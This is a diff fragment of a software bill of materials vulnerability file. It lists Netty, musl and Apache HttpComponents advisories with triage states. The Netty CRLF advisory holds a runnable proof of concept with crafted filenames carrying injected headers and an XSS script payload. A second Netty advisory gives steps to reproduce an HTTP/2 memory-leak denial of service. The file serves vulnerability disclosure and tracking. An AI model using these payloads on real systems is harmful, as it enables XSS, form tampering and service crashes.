+      ]
+    },
+    {
+      "bom-ref" : "309e8001-1cf1-46ef-aab9-713ce2ff7e78",
+      "id" : "GHSA-gcjf-9mgh-3p7g",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 5.7,
+          "severity" : "medium",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "cwes" : [
+        93
+      ],
+      "description" : "# Security Vulnerability Report: CRLF Injection via Multipart Filename in Netty HttpPostRequestEncoder\n\n## 1. Vulnerability Summary\n\n| Field | Value |\n|-------|-------|\n| **Product** | Netty |\n| **Version** | 4.2.12.Final (and all prior versions with codec-http multipart) |\n| **Component** | `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` |\n| **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences / CWE-113: HTTP Response Splitting |\n| **Impact** | MIME Header Injection / Content-Type Spoofing / XSS via Content-Disposition |\n| **CVSS 3.1 Score** | **8.1 (High)** |\n| **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |\n| **Attack Vector** | Network |\n| **Attack Complexity** | Low |\n| **Privileges Required** | Low (attacker must be able to upload files with controlled filenames) |\n| **User Interaction** | None |\n| **Scope** | Unchanged |\n| **Confidentiality Impact** | High |\n| **Integrity Impact** | High |\n| **Availability Impact** | None |\n\n## 2. Affected Components\n\nThe following classes in the `codec-http` module are affected:\n\n- `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` — directly concatenates unvalidated filename/name into `Content-Disposition` MIME headers (lines 519, 633, 674, 682, 686-688)\n- `io.netty.handler.codec.http.multipart.DiskFileUpload` — `setFilename()` only checks null (line 78)\n- `io.netty.handler.codec.http.multipart.MemoryFileUpload` — `setFilename()` only checks null (line 60)\n- `io.netty.handler.codec.http.multipart.MixedFileUpload` — `setFilename()` delegates without validation (line 62)\n\n## 3. Vulnerability Description\n\nNetty's `HttpPostRequestEncoder` constructs multipart HTTP request bodies by directly concatenating user-supplied filenames and field names into `Content-Disposition` MIME headers **without validating or sanitizing CRLF characters** (`\\r\\n`). Since MIME headers are delimited by CRLF, an attacker who controls the filename can inject arbitrary MIME headers into the multipart body part.\n\n### Root Cause\n\nIn `HttpPostRequestEncoder.java`, multiple code paths directly embed `fileUpload.getFilename()` into header strings:\n\n```java\n// Line 674 (attachment mode):\ninternal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + \": \"\n    + HttpHeaderValues.ATTACHMENT + \"; \"\n    + HttpHeaderValues.FILENAME + \"=\\\"\" + fileUpload.getFilename() + \"\\\"\\r\\n\");\n//                                        ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION\n\n// Lines 686-688 (form-data mode):\ninternal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + \": \" + HttpHeaderValues.FORM_DATA + \"; \"\n    + HttpHeaderValues.NAME + \"=\\\"\" + fileUpload.getName() + \"\\\"; \"\n    + HttpHeaderValues.FILENAME + \"=\\\"\" + fileUpload.getFilename() + \"\\\"\\r\\n\");\n//                                        ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION\n\n// Line 519 (attribute name):\ninternal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + \": \" + HttpHeaderValues.FORM_DATA + \"; \"\n    + HttpHeaderValues.NAME + \"=\\\"\" + attribute.getName() + \"\\\"\\r\\n\");\n//                                    ^^^^^^^^^^^^^^^^^ NO VALIDATION\n```\n\nThe `setFilename()` method in all `FileUpload` implementations only checks for null:\n\n```java\n// DiskFileUpload.java:77-79\npublic void setFilename(String filename) {\n    this.filename = ObjectUtil.checkNotNull(filename, \"filename\");\n    // NO CRLF VALIDATION\n}\n```\n\n### Comparison with Similar Fixed CVEs\n\nThis vulnerability follows the same pattern as:\n\n| CVE | Component | Fix |\n|-----|-----------|-----|\n| **GHSA-jq43-27x9-3v86** | SmtpRequestEncoder — SMTP command injection | Added CRLF validation in `SmtpUtils.validateSMTPParameters()` |\n| **GHSA-84h7-rjj3-6jx4** | HttpRequestEncoder — CRLF in URI | Added `HttpUtil.validateRequestLineTokens()` |\n\nThe multipart encoder has **no equivalent validation** for filenames or field names.\n\n## 4. Exploitability Prerequisites\n\nThis vulnerability is exploitable when:\n\n1. The application uses Netty's `HttpPostRequestEncoder` to construct multipart HTTP requests\n2. The filename of an uploaded file is derived from user-controlled input\n3. The application does **not** perform its own CRLF sanitization on filenames\n\n**Common affected patterns**:\n- File upload proxies that forward user-supplied filenames\n- API gateways that construct multipart requests from incoming parameters\n- Microservice communication that passes filenames between services\n- Testing/automation frameworks that use Netty HTTP client with user-defined filenames\n\n## 5. Attack Scenarios\n\n### Scenario 1: Content-Type Override via Filename Injection\n\nAn attacker uploads a file with a crafted filename to override the Content-Type of the multipart body part, potentially enabling stored XSS:\n\n```java\nString maliciousFilename = \"photo.jpg\\\"\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert(document.cookie)</script>\\r\\n--\";\n\nDiskFileUpload upload = new DiskFileUpload(\n    \"avatar\", maliciousFilename, \"image/jpeg\", \"binary\", UTF_8, fileSize);\n```\n\n**Wire format:**\n```\n--boundary\ncontent-disposition: form-data; name=\"avatar\"; filename=\"photo.jpg\"\nContent-Type: text/html                    <-- INJECTED: overrides image/jpeg\n\n<script>alert(document.cookie)</script>    <-- INJECTED: XSS payload\n--\"\ncontent-type: image/jpeg                   <-- Original (now ignored by many parsers)\n...\n```\n\nIf the receiving server parses the **first** `Content-Type`, the file is treated as HTML instead of JPEG, enabling XSS when the file is served back.\n\n### Scenario 2: Arbitrary MIME Header Injection\n\n```java\nString filename = \"doc.pdf\\\"\\r\\nX-Custom-Auth: admin-token-12345\\r\\nX-Bypass-Check: true\";\n```\n\nInjects arbitrary headers into the multipart body part that may be processed by downstream middleware or application logic.\n\n### Scenario 3: Multipart Boundary Confusion\n\n```java\nString filename = \"file.txt\\\"\\r\\n\\r\\nmalicious body content\\r\\n--boundary\\r\\nContent-Disposition: form-data; name=\\\"secret\";\n```\n\nBy injecting a new boundary delimiter, the attacker can:\n- Terminate the current body part prematurely\n- Start a new body part with a different field name\n- Override form fields processed by the server\n\n## 6. Proof of Concept\n\n### Full Runnable PoC Source Code (MultipartFilenameInjectionPoC.java)\n\n```java\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.multipart.*;\n\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.nio.charset.StandardCharsets;\n\n/**\n * PoC: HTTP Multipart Content-Disposition Header Injection via Filename\n *\n * Demonstrates that HttpPostRequestEncoder does not validate filenames\n * for CRLF characters, allowing injection of arbitrary MIME headers\n * into multipart form data.\n */\npublic class MultipartFilenameInjectionPoC {\n\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"=== Netty Multipart Filename CRLF Injection PoC ===\\n\");\n\n        testFilenameInjection();\n\n        System.out.println(\"\\n=== PoC Complete ===\");\n    }\n\n    static void testFilenameInjection() throws Exception {\n        System.out.println(\"[TEST 1] Filename CRLF Injection in Content-Disposition\");\n        System.out.println(\"-------------------------------------------------------\");\n\n        // Create a temporary file for upload\n        File tempFile = File.createTempFile(\"test\", \".txt\");\n        tempFile.deleteOnExit();\n        try (FileWriter fw = new FileWriter(tempFile)) {\n            fw.write(\"test content\");\n        }\n\n        // Malicious filename with CRLF to inject Content-Type header\n        String maliciousFilename =\n            \"innocent.txt\\\"\\r\\nContent-Type: text/html\\r\\nX-Injected: true\\r\\n\\r\\n\" +\n            \"<script>alert(1)</script>\\r\\n--\";\n\n        HttpRequest request = new DefaultHttpRequest(\n            HttpVersion.HTTP_1_1, HttpMethod.POST, \"/upload\");\n\n        HttpPostRequestEncoder encoder = new HttpPostRequestEncoder(\n                new DefaultHttpDataFactory(false), request, true,\n                StandardCharsets.UTF_8, HttpPostRequestEncoder.EncoderMode.RFC3986);\n\n        DiskFileUpload fileUpload = new DiskFileUpload(\n                \"file\", maliciousFilename, \"application/octet-stream\",\n                \"binary\", StandardCharsets.UTF_8, tempFile.length());\n        fileUpload.setContent(tempFile);\n\n        encoder.addBodyHttpData(fileUpload);\n        encoder.finalizeRequest();\n\n        // Read the encoded multipart body\n        StringBuilder body = new StringBuilder();\n        while (!encoder.isEndOfInput()) {\n            HttpContent chunk = encoder.readChunk(Unpooled.buffer().alloc());\n            if (chunk != null) {\n                body.append(chunk.content().toString(StandardCharsets.UTF_8));\n                chunk.release();\n            }\n        }\n        encoder.cleanFiles();\n\n        String encoded = body.toString();\n        System.out.println(\"Malicious filename: \" +\n            maliciousFilename.replace(\"\\r\", \"\\\\r\").replace(\"\\n\", \"\\\\n\"));\n        System.out.println();\n        System.out.println(\"Encoded multipart body:\");\n        System.out.println(\"---\");\n        for (String line : encoded.split(\"\\n\", -1)) {\n            System.out.println(\"  \" + line.replace(\"\\r\", \"\\\\r\"));\n        }\n        System.out.println(\"---\");\n\n        boolean hasInjectedHeader = encoded.contains(\"X-Injected: true\");\n        boolean hasInjectedScript = encoded.contains(\"<script>\");\n        System.out.println();\n        System.out.println(\"Injected X-Injected header: \" + hasInjectedHeader);\n        System.out.println(\"Injected script tag: \" + hasInjectedScript);\n        System.out.println(\"VULNERABLE: \" +\n            ((hasInjectedHeader || hasInjectedScript) ?\n                \"YES - MIME header injection!\" : \"NO\"));\n\n        tempFile.delete();\n    }\n}\n```\n\n### How to Compile and Run\n\n```bash\n# Build Netty (skip tests)\n./mvnw install -pl common,buffer,codec,codec-base,codec-http,transport -DskipTests \\\n  -Dcheckstyle.skip=true -Denforcer.skip=true -Djapicmp.skip=true \\\n  -Danimal.sniffer.skip=true -Drevapi.skip=true -Dforbiddenapis.skip=true \\\n  -Dspotbugs.skip=true -q\n\n# Set classpath\nJARS=$(find ~/.m2/repository/io/netty -name \"netty-*.jar\" -path \"*/4.2.12.Final/*\" \\\n  | grep -v sources | grep -v javadoc | tr '\\n' ':')\n\n# Compile and run\njavac -cp \"$JARS\" MultipartFilenameInjectionPoC.java\njava -cp \"$JARS:.\" MultipartFilenameInjectionPoC\n```\n\n### PoC Execution Output (Verified on Netty 4.2.12.Final)\n\n```\n=== Netty Multipart Filename CRLF Injection PoC ===\n\n[TEST 1] Filename CRLF Injection in Content-Disposition\n-------------------------------------------------------\nMalicious filename: innocent.txt\"\\r\\nContent-Type: text/html\\r\\nX-Injected: true\\r\\n\\r\\n<script>alert(1)</script>\\r\\n--\n\nEncoded multipart body:\n---\n  --88aaade41dbb9f9f\\r\n  content-disposition: form-data; name=\"file\"; filename=\"innocent.txt\"\\r\n  Content-Type: text/html\\r                          <-- INJECTED\n  X-Injected: true\\r                                 <-- INJECTED\n  \\r\n  <script>alert(1)</script>\\r                        <-- INJECTED XSS\n  --\"\\r\n  content-length: 12\\r\n  content-type: application/octet-stream\\r\n  content-transfer-encoding: binary\\r\n  \\r\n  test content\\r\n  --88aaade41dbb9f9f--\\r\n---\n\nInjected X-Injected header: true\nInjected script tag: true\nVULNERABLE: YES - MIME header injection!\n\n\n=== PoC Complete ===\n```\n\n## 7. Impact Analysis\n\n| Impact Category | Description |\n|----------------|-------------|\n| **Confidentiality** | HIGH — Injected headers may bypass access controls or leak tokens |\n| **Integrity** | HIGH — Content-Type override enables stored XSS; field name injection allows form data manipulation |\n| **Content-Type Spoofing** | Override `application/octet-stream` to `text/html` to serve executable content |\n| **Stored XSS** | Inject `<script>` tags via Content-Type override when uploaded files are served back |\n| **Form Field Override** | Inject new multipart boundaries to create/override form fields |\n| **Downstream Injection** | Custom MIME headers may affect middleware, CDN, or storage layer behavior |\n\n## 8. Remediation Recommendations\n\n### Option 1: Validate in FileUpload.setFilename() (Recommended)\n\n```java\n// DiskFileUpload.java / MemoryFileUpload.java / MixedFileUpload.java\npublic void setFilename(String filename) {\n    ObjectUtil.checkNotNull(filename, \"filename\");\n    for (int i = 0; i < filename.length(); i++) {\n        char c = filename.charAt(i);\n        if (c == '\\r' || c == '\\n') {\n            throw new IllegalArgumentException(\n                \"filename contains prohibited CRLF character at index \" + i);\n        }\n    }\n    this.filename = filename;\n}\n```\n\n### Option 2: Sanitize in HttpPostRequestEncoder (Defense-in-Depth)\n\nEscape or reject CRLF characters when building Content-Disposition headers:\n\n```java\n// HttpPostRequestEncoder.java - add helper method\nprivate static String sanitizeHeaderParam(String value) {\n    for (int i = 0; i < value.length(); i++) {\n        char c = value.charAt(i);\n        if (c == '\\r' || c == '\\n' || c == '\"') {\n            throw new ErrorDataEncoderException(\n                \"Multipart parameter contains prohibited character at index \" + i);\n        }\n    }\n    return value;\n}\n\n// Then use in Content-Disposition construction:\ninternal.addValue(... + \"=\\\"\" + sanitizeHeaderParam(fileUpload.getFilename()) + \"\\\"\\r\\n\");\n```\n\n### Option 3: RFC 2231/5987 Encoding for Filenames\n\nUse proper RFC 2231 encoding for filenames with special characters:\n\n```java\n// Encode filename per RFC 5987:\n// filename*=UTF-8''encoded%20filename\nString encodedFilename = \"UTF-8''\" + URLEncoder.encode(filename, \"UTF-8\");\ninternal.addValue(... + \"filename*=\" + encodedFilename + \"\\r\\n\");\n```\n\n## 9. References\n\n- [RFC 2183: Content-Disposition Header Field](https://tools.ietf.org/html/rfc2183)\n- [RFC 7578: Returning Values from Forms: multipart/form-data](https://tools.ietf.org/html/rfc7578)\n- [RFC 5987: Character Set and Language Encoding for HTTP Header Field Parameters](https://tools.ietf.org/html/rfc5987)\n- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)\n- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)\n- [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)\n- [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4)",
+      "published" : "2026-07-22T21:52:55Z",
+      "updated" : "2026-07-22T21:52:59Z",
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "50acd5f1-0856-4a1c-b1d9-9cbd154209e5",
+      "id" : "CVE-2025-26519",
+      "source" : {
+        "name" : "NVD",
+        "url" : "https://nvd.nist.gov/"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "NVD",
+            "url" : "https://nvd.nist.gov/"
+          },
+          "score" : 7.0,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "cwes" : [
+        787
+      ],
+      "description" : "musl libc 0.9.13 through 1.2.5 before 1.2.6 has an out-of-bounds write vulnerability when an attacker can trigger iconv conversion of untrusted EUC-KR text to UTF-8.",
+      "published" : "2025-02-14T04:15:09Z",
+      "updated" : "2026-06-17T09:01:57Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "c92a80f4-5122-4f7b-8d20-ff9e1012a331",
+      "id" : "GHSA-93wv-jw9v-4972",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes" : [
+        400
+      ],
+      "description" : "### Summary\n\nA remote, unauthenticated peer can leak one direct `ByteBuf` per HTTP/2 `DATA` frame in\napplications that enable HTTP/2 content decompression via `DelegatingDecompressorFrameListener`.\nWhen a `DATA` frame is processed for a stream whose decompressor has already been closed,\n`Http2Decompressor.decompress(...)` retains the frame buffer but never releases it on the error\npath, so its reference count never returns to zero. Repeating this over a long-lived HTTP/2\nconnection exhausts direct memory and crashes the JVM with `OutOfMemoryError` — a denial of service.\n\n### Details\n\nIn `codec-http2/src/main/java/io/netty/handler/codec/http2/DelegatingDecompressorFrameListener.java`,\n`Http2Decompressor.decompress(...)` does:\n\n```java\n// around line 433\ndecompressor.writeInbound(data.retain());\n```\n\nThe argument `data.retain()` is evaluated **before** `writeInbound(...)` executes, incrementing the\nbuffer's reference count (`refCnt: 1 -> 2`). The very first statement of\n`EmbeddedChannel.writeInbound(...)` is `ensureOpen()` (`EmbeddedChannel.java:360`), which throws\n`ClosedChannelException` when the decompressor's internal `EmbeddedChannel` has already been closed.\n\nWhen that happens:\n- the `DATA` payload has been `retain()`ed but never entered the pipeline, so the decoder's\n  `finally { release() }` never runs;\n- the surrounding `catch (Throwable t)` block in `decompress(...)` (around line 451) does **not**\n  release the extra reference;\n- the input buffer therefore can never reach refCnt 0, and its (typically direct) memory is leaked.\n\nThe decompressor channel is closed on a reachable path:\n`Http2Connection` `onStreamRemoved` → `Http2Decompressor.cleanup()` →\n`EmbeddedChannel.finishAndReleaseAll()`\n(`DelegatingDecompressorFrameListener.java:125-133` and `418-420`).\n\nA peer that sends `DATA` frames for a stream whose decompressor has already been cleaned up (e.g.\ncontinuing to send `DATA` after `END_STREAM` / stream removal) thus leaks one direct `ByteBuf` per\nframe.\n\n**Affected code**: `DelegatingDecompressorFrameListener.java`, method `Http2Decompressor.decompress(...)`\n— the `decompressor.writeInbound(data.retain())` call (line ~433) and its `catch (Throwable t)`\nblock (line ~451), which lacks a `data.release()` rollback.\n\n**Suggested fix**: track whether `writeInbound` succeeded and roll back the extra `retain()` only when\nthe data never entered the pipeline:\n\n```java\nboolean writeSucceeded = false;\ntry {\n    decompressor.writeInbound(data.retain());\n    writeSucceeded = true;            // pipeline now owns the release\n    if (endOfStream) {\n        decompressor.finish();\n    }\n    return 0;\n} catch (Throwable t) {\n    if (!writeSucceeded) {\n        data.release();               // roll back the extra retain(); data never entered pipeline\n    }\n    if (t instanceof Http2Exception) {\n        throw (Http2Exception) t;\n    }\n    throw streamError(stream.id(), INTERNAL_ERROR, t, ...);\n}\n```\n\n| Case | writeSucceeded | catch action | Reason |\n|------|:---:|---|---|\n| `ensureOpen()` throws (this bug) | `false` | `data.release()` | data never entered pipeline |\n| handler throws internally | `true` | no release | decoder `finally` already released |\n| `finish()` throws | `true` | no release | `writeInbound` already succeeded |\n\n### PoC\n\nReproduced against the official, unmodified `netty-codec-http2-4.2.15.Final.jar` from Maven Central,\nusing real netty classes and measuring `ByteBuf.refCnt()` directly (the leaking logic is not mocked).\n\nReproduction steps:\n\n1. Download the official artifacts and their dependencies from Maven Central (version `4.2.15.Final`):\n   `netty-common`, `netty-buffer`, `netty-transport`, `netty-resolver`, `netty-handler`,\n   `netty-codec-base`, `netty-codec`, `netty-codec-http`, `netty-codec-http2`,\n   `netty-codec-compression`.\n2. Build a real `Http2Decompressor` wrapping a real gzip decoder `EmbeddedChannel`\n   (`ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP)`).\n3. Close the internal decompressor channel (equivalent to the end state of\n   `cleanup()` / `finishAndReleaseAll()`).\n4. Encode a real gzip `DATA` payload with `ZlibCodecFactory.newZlibEncoder(GZIP)` (`refCnt = 1`).\n5. Call `decompress(...)` on the closed channel.\n6. Observe: `writeInbound(...)` throws `ClosedChannelException` at its `ensureOpen()` entry\n   (`EmbeddedChannel.java:360`), reached from `DelegatingDecompressorFrameListener.java:433`;\n   `data.refCnt()` is now `2`.\n7. Release once as the frame reader would; `refCnt` stays at `1` (`release()` returns `false`) → leaked.\n\nObserved reference-count trace:\n\n```\ngzipData initial refCnt = 1\ndecompress -> data.retain()        -> refCnt = 2   (retain applied, never rolled back)\ncaller releases once               -> refCnt = 1   (release() returns false; not deallocated)\n=> buffer never reaches 0 -> direct memory leaked\n```\n\nObserved exception stack (confirms the leak point):\n\n```\njava.nio.channels.ClosedChannelException\n    at io.netty.channel.embedded.EmbeddedChannel.checkOpen(EmbeddedChannel.java:959)\n    at io.netty.channel.embedded.EmbeddedChannel.ensureOpen(EmbeddedChannel.java:979)\n    at io.netty.channel.embedded.EmbeddedChannel.writeInbound(EmbeddedChannel.java:360)\n    at io.netty.handler.codec.http2.DelegatingDecompressorFrameListener$Http2Decompressor\n            .decompress(DelegatingDecompressorFrameListener.java:433)\n```\n\nTwo notes on the harness (they do not affect the leak mechanism):\n- The internal channel is closed directly via `close()` rather than through `cleanup()`. The end\n  state is identical (channel closed → `writeInbound` throws at `ensureOpen()`); the bug depends on\n  \"channel closed → retain not rolled back\", not on *how* the channel was closed.\n- In the isolated harness the rethrown `StreamException`'s root cause shows as `NullPointerException`\n  because the harness does not initialise an `Http2LocalFlowController` (a secondary exception\n  reported during channel close). The leak is already sealed at the `ClosedChannelException` thrown\n  by `writeInbound`'s `ensureOpen()` (line 360); in a real server with the flow controller\n  initialised, the triggering exception is the `ClosedChannelException` itself.\n\nA complete self-contained PoC (`Verify02DecompressLeak.java`, ~150 lines, no test framework) plus the\nexact `javac` / `java` commands can be attached on request.\n\n### Impact\n\n- **Vulnerability type**: uncontrolled resource consumption / memory leak (CWE-401), leading to\n  denial of service. Each crafted `DATA` frame leaks one (typically direct/off-heap) `ByteBuf`.\n- **Who is impacted**: any server (or client) that enables HTTP/2 content decompression by installing\n  `DelegatingDecompressorFrameListener` in its HTTP/2 pipeline.\n- **Attacker requirements**: remote, unauthenticated. The attacker only needs to send HTTP/2 `DATA`\n  frames for a stream whose decompressor has been cleaned up (e.g. continue sending `DATA` after\n  `END_STREAM`). No special server configuration beyond decompression being enabled.\n- **Result**: sustained triggering over a long-lived connection exhausts direct memory and crashes\n  the JVM with `OutOfMemoryError`.",
+      "published" : "2026-07-31T16:51:50Z",
+      "updated" : "2026-07-31T16:51:51Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "6c9869f0-63d7-4a29-a4ae-18ef270ec6ce",
+      "id" : "GHSA-hf6x-8p5f-cgmf",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes" : [
+        400
+      ],
+      "description" : "Uncontrolled Resource Consumption vulnerability in the HTTP/1.1 message parser in Apache HttpComponents Core (5.4.2 and earlier, 5.5-beta1 and earlier) allows a remote attacker to cause a denial of service through memory exhaustion by sending messages with excessive number of headers / excessive header length",
+      "published" : "2026-07-01T18:31:55Z",
+      "updated" : "2026-08-12T19:24:46Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_reachable",
+        "detail" : "We don't use the Apache Server from HAPI. We use the Tomcat Server from Spring."
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    }
+  ]
+}
